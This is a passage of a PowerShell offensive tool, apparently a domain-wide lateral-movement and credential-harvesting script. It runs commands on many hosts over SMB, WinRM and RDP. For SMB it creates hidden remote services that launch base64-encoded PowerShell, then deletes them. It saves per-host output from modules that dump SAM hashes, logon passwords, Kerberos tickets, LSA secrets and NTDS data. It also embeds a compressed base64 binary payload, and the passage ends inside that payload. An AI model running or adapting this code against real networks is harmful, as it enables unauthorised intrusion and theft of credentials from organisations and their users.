	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	Start-Sleep -Milliseconds 2000
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		return "Timed Out"

	} catch {
		Write-Output "unexpected error"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command 2>&1 | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
    return Enter-SMBSession -ComputerName $ComputerName -Command $Command




}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            $result = $result.trim()


            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unexpected Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
             
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                }
                 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################### Function: WinRM ################################################
################################################################################################################
Function Method-WinRM {
Write-host


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }
      
        try {
        
        if ($Command -eq ""){
            return Invoke-Command -ComputerName $computerName -ScriptBlock  {echo "Successful Connection PME"}  -ErrorAction Stop
        }   
            return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop
        } catch {
            if ($_.Exception.Message -like "*Access is Denied*") {
                return "Access Denied"
            } if ($_.Exception.Message -like "*cannot be resolved*") {
                return "Unable to connect"
        }
    }
}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete


do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            $result = $result.trim()

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            }
             
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })





# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

}


################################################################################################################
################################################# Function: RDP ################################################
################################################################################################################
Function Method-RDP {
$ErrorActionPreference = "SilentlyContinue"
Write-Host

$MaxConcurrentJobs = $Threads
$RDPJobs = @()

# Setting up runspaces for Port Checking
$runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$RunSpaceScriptBlock = {
    param ($computerName)
    
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if ($connected) { return "Connected" }
    else { return "Unable to connect" }
}

foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
    })
}

$FailedComputers = @()

do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

            if ($result -eq "Unable to connect") {
                $FailedComputers += $runspace.ComputerName
                continue
            }
           
            # Cleanup for completed runspaces
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Final cleanup
$runspacePool.Close()
$runspacePool.Dispose()


foreach ($Computer in $Computers) {
$OS = $computer.Properties["operatingSystem"][0]
$ComputerName = $computer.Properties["dnshostname"][0]
    # Check if the computer is in the FailedComputers list
    if ($ComputerName -in $FailedComputers) {continue}

$ScriptBlock = {

            Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly)


function Invoke-SharpRDP{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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